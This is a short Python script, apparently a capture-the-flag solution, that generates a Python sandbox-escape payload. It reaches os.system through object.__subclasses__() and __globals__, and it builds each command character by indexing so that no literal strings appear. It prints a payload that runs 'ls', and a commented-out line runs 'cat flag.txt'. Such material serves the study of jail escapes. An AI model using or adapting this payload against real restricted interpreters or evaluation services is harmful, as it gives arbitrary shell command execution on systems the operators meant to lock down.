s = "().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__)[77]"
y = "().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__)[78]"
s = "().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__)[79]"
t = "().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__)[80]"
e = "().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__)[81]"
m = "().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__)[82]"

l = "().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__)[155]"
a = "().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__)[5]"
c = "().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__)[24]"
SPACE = "().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__)[33]"

f = "().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__)[120]"
g = "().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__)[67]"
PERIOD = "().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__)[92]"
x = "().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__)[57]"

def build(cs):
	payload = ""
	for c in cs:
		payload = payload+c+"+"
		#print(c)
	return payload[:-1]

#print("print("+s+"+"+y+"+"+s+"+"+t+"+"+e+"+"+m+")")

omglul = "print(().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__["+build([s,y,s,t,e,m])+"]("+build([l,s])+"))"
#omglul = "print(().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__["+build([s,y,s,t,e,m])+"]("+build([c,a,t,SPACE,f,l,a,g,PERIOD,t,x,t])+"))"

#print(build([s,y,s,t,e,m]))
#print(build([l,s]))
print(omglul)
